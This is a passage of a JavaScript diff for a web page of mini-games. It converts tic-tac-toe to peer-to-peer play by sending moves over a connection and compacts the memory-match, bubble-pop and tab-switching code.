-    status.textContent = `${getTurnText(currentPlayer)} Tap a square ✨`;
-    updateScoreboard();
   }
 
-  function handleTTTClick(e) {
+  function handleCellClick(e) {
+    if (!gameActive || !myTurn) return;
+    
     const index = parseInt(e.target.dataset.index);
-    if (!gameActive || boardState[index]) return;
+    if (boardState[index] !== null) return;
 
-    boardState[index] = currentPlayer;
-    e.target.textContent = currentPlayer;
-    e.target.classList.add(currentPlayer.toLowerCase());
+    // لعب محلياً
+    boardState[index] = mySymbol;
+    e.target.textContent = mySymbol;
+    e.target.classList.add(mySymbol.toLowerCase());
+    myTurn = false;
 
-    const winPatterns = [
-      [0,1,2],[3,4,5],[6,7,8],
-      [0,3,6],[1,4,7],[2,5,8],
-      [0,4,8],[2,4,6]
-    ];
+    // إرسال الحركة للخصم
+    if (gameConn && gameConn.open) {
+      gameConn.send({ type: 'move', index: index });
+    }
 
+    checkWinner();
+    if (gameActive) {
+      status.textContent = "⏳ Waiting for " + opponentSymbol + "...";
+    }
+  }
+
+  function checkWinner() {
+    const winPatterns = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
     let winner = null;
     for (const p of winPatterns) {
       if (boardState[p[0]] && boardState[p[0]] === boardState[p[1]] && boardState[p[1]] === boardState[p[2]]) {
@@ -644,200 +545,114 @@ body {
 
     if (winner) {
       gameActive = false;
-      if (winner === 'X') scoreX += 1;
-      if (winner === 'O') scoreO += 1;
-      updateScoreboard();
-      status.textContent = `🎉 ${getPlayerLabel(winner)} wins! 🎉`;
+      if (winner === mySymbol) {
+        status.textContent = "🎉 You win! 🎉";
+      } else {
+        status.textContent = "😅 " + opponentSymbol + " wins!";
+      }
       return;
     }
 
     if (boardState.every(c => c)) {
       gameActive = false;
       status.textContent = "🤝 It's a tie! 🤝";
-      return;
     }
-
-    currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
-    status.textContent = getTurnText(currentPlayer);
   }
 
-  resetBtn.addEventListener('click', initTTT);
-  initTTT();
+  resetBtn.addEventListener('click', function() {
+    initBoard();
+    if (gameConn && gameConn.open) {
+      gameConn.send({ type: 'reset' });
+    }
+  });
+
+  initBoard();
 })();
 
 // ============================================================
-// 🧠 GAME 2: MEMORY MATCH
+// 🧠 MEMORY MATCH
 // ============================================================
 (function() {
   const grid = document.getElementById('memoryGrid');
   const scoreSpan = document.getElementById('memoryScore');
   const resetBtn = document.getElementById('memoryReset');
-
   const emojis = ['🐶','🐱','🐸','🦊','🐼','🐨','🦁','🐯'];
-  let cards = [];
-  let flippedCards = [];
-  let matched = 0;
-  let lockBoard = false;
-
-  function shuffle(arr) {
-    for (let i = arr.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [arr[i], arr[j]] = [arr[j], arr[i]];
-    }
-    return arr;
-  }
-
+  let flippedCards = []; let matched = 0; let lockBoard = false;
+  function shuffle(arr) { for (let i = arr.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [arr[i], arr[j]] = [arr[j], arr[i]]; } return arr; }
   function initMemory() {
-    grid.innerHTML = '';
-    matched = 0;
-    flippedCards = [];
-    lockBoard = false;
-    scoreSpan.textContent = '0';
-
+    grid.innerHTML = ''; matched = 0; flippedCards = []; lockBoard = false; scoreSpan.textContent = '0';
     const doubled = shuffle([...emojis, ...emojis]);
-    doubled.forEach((emoji, index) => {
+    doubled.forEach((emoji) => {
       const card = document.createElement('div');
-      card.className = 'memory-card';
-      card.dataset.index = index;
-      card.dataset.emoji = emoji;
-      card.addEventListener('click', flipCard);
+      card.className = 'memory-card'; card.dataset.emoji = emoji;
+      card.addEventListener('click', function() {
+        if (lockBoard || this.classList.contains('flipped') || this.classList.contains('matched')) return;
+        this.textContent = this.dataset.emoji; this.classList.add('flipped');
+        flippedCards.push(this);
+        if (flippedCards.length === 2) {
+          lockBoard = true;
+          const c1 = flippedCards[0], c2 = flippedCards[1];
+          if (c1.dataset.emoji === c2.dataset.emoji) {
+            c1.classList.add('matched'); c2.classList.add('matched');
+            matched++; scoreSpan.textContent = matched; flippedCards = []; lockBoard = false;
+            if (matched === 8) setTimeout(() => alert('🎉 You won!'), 300);
+          } else {
+            setTimeout(() => { c1.textContent = ''; c1.classList.remove('flipped'); c2.textContent = ''; c2.classList.remove('flipped'); flippedCards = []; lockBoard = false; }, 800);
+          }
+        }
+      });
       grid.appendChild(card);
     });
   }
-
-  function flipCard() {
-    if (lockBoard || this.classList.contains('flipped') || this.classList.contains('matched')) return;
-
-    this.textContent = this.dataset.emoji;
-    this.classList.add('flipped');
-    flippedCards.push(this);
-
-    if (flippedCards.length === 2) {
-      lockBoard = true;
-      const card1 = flippedCards[0];
-      const card2 = flippedCards[1];
-
-      if (card1.dataset.emoji === card2.dataset.emoji) {
-        card1.classList.add('matched');
-        card2.classList.add('matched');
-        matched++;
-        scoreSpan.textContent = matched;
-        flippedCards = [];
-        lockBoard = false;
-
-        if (matched === 8) {
-          setTimeout(() => alert('🎉 You won! Amazing memory! 🧠✨'), 300);
-        }
-      } else {
-        setTimeout(() => {
-          card1.textContent = '';
-          card1.classList.remove('flipped');
-          card2.textContent = '';
-          card2.classList.remove('flipped');
-          flippedCards = [];
-          lockBoard = false;
-        }, 800);
-      }
-    }
-  }
-
   resetBtn.addEventListener('click', initMemory);
   initMemory();
 })();
 
 // ============================================================
-// 🫧 GAME 3: BUBBLE POP
+// 🫧 BUBBLE POP
 // ============================================================
 (function() {
   const area = document.getElementById('bubbleArea');
   const scoreSpan = document.getElementById('bubbleScore');
   const resetBtn = document.getElementById('bubbleReset');
-  let score = 0;
-  let bubbleInterval;
-
+  let score = 0; let bubbleInterval;
   const colors = ['#ff6b6b','#ffd93d','#6bcb77','#4d96ff','#ff6bff','#ff9f43','#00d2d3','#a29bfe'];
   const symbols = ['😊','🌟','⭐','❤️','🎈','🎉','💎','🍭','🌈','🦋','🌸','🍀'];
-
   function createBubble() {
     if (area.children.length > 25) return;
-
     const size = 40 + Math.random() * 40;
     const x = Math.random() * (area.offsetWidth - size - 10) + 5;
-    const y = area.offsetHeight - size - 10;
     const color = colors[Math.floor(Math.random() * colors.length)];
     const symbol = symbols[Math.floor(Math.random() * symbols.length)];
-
     const bubble = document.createElement('div');
     bubble.className = 'bubble';
-    bubble.style.width = size + 'px';
-    bubble.style.height = size + 'px';
-    bubble.style.left = x + 'px';
-    bubble.style.top = y + 'px';
-    bubble.style.background = `radial-gradient(circle at 30% 30%, ${color}, ${color}dd)`;
-    bubble.style.boxShadow = `0 4px 15px ${color}66, inset 0 -3px 8px rgba(0,0,0,0.1)`;
-    bubble.style.animationDuration = (2 + Math.random() * 2) + 's';
+    bubble.style.cssText = \`width:\${size}px;height:\${size}px;left:\${x}px;bottom:10px;background:radial-gradient(circle at 30% 30%, \${color}, \${color}dd);box-shadow:0 4px 15px \${color}66;animation-duration:\${2+Math.random()*2}s;font-size:\${size*0.45}px;\`;
     bubble.textContent = symbol;
-    bubble.style.fontSize = (size * 0.45) + 'px';
-
     bubble.addEventListener('click', function(e) {
       e.stopPropagation();
       if (this.classList.contains('popped')) return;
-
-      this.classList.add('popped');
-      score++;
-      scoreSpan.textContent = score;
-
-      // Visual feedback
-      const splash = document.createElement('div');
-      splash.style.cssText = `position:absolute;left:${this.style.left};top:${this.style.top};width:${this.style.width};height:${this.style.height};border-radius:50%;background:${color};animation:popAnim 0.3s ease forwards;pointer-events:none;z-index:0;`;
-      area.appendChild(splash);
-      setTimeout(() => splash.remove(), 400);
-
+      this.classList.add('popped'); score++; scoreSpan.textContent = score;
       setTimeout(() => this.remove(), 300);
     });
-
     area.appendChild(bubble);
-
-    // Animate upward
     let pos = area.offsetHeight - size - 10;
     const floatInt = setInterval(() => {
       pos -= 1;
-      if (pos < -size || bubble.classList.contains('popped')) {
-        clearInterval(floatInt);
-        if (!bubble.classList.contains('popped')) bubble.remove();
-      } else {
-        bubble.style.top = pos + 'px';
-      }
+      if (pos < -size || bubble.classList.contains('popped')) { clearInterval(floatInt); if (!bubble.classList.contains('popped')) bubble.remove(); }
+      else bubble.style.top = pos + 'px';
     }, 40);
   }
-
   function initBubble() {
-    area.innerHTML = '';
-    score = 0;
-    scoreSpan.textContent = '0';
+    area.innerHTML = ''; score = 0; scoreSpan.textContent = '0';
     clearInterval(bubbleInterval);
-    // Create initial bubbles
-    for (let i = 0; i < 10; i++) {
-      setTimeout(createBubble, i * 100);
-    }
-    // Keep spawning
+    for (let i = 0; i < 10; i++) setTimeout(createBubble, i * 100);
     bubbleInterval = setInterval(createBubble, 1200);
   }
-
   resetBtn.addEventListener('click', initBubble);
-  // Start when tab shown
-  const observer = new MutationObserver(() => {
-    if (document.getElementById('game-bubble').classList.contains('active')) {
-      if (area.children.length === 0) initBubble();
-    }
-  });
-  observer.observe(document.getElementById('game-bubble'), { attributes: true, attributeFilter: ['class'] });
   initBubble();
 })();
 
-// ============================================================
-// 🔄 TAB SWITCHING
-// ============================================================
+// Tab switching
 document.querySelectorAll('.tab-btn').forEach(btn => {
   btn.addEventListener('click', function() {
     document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
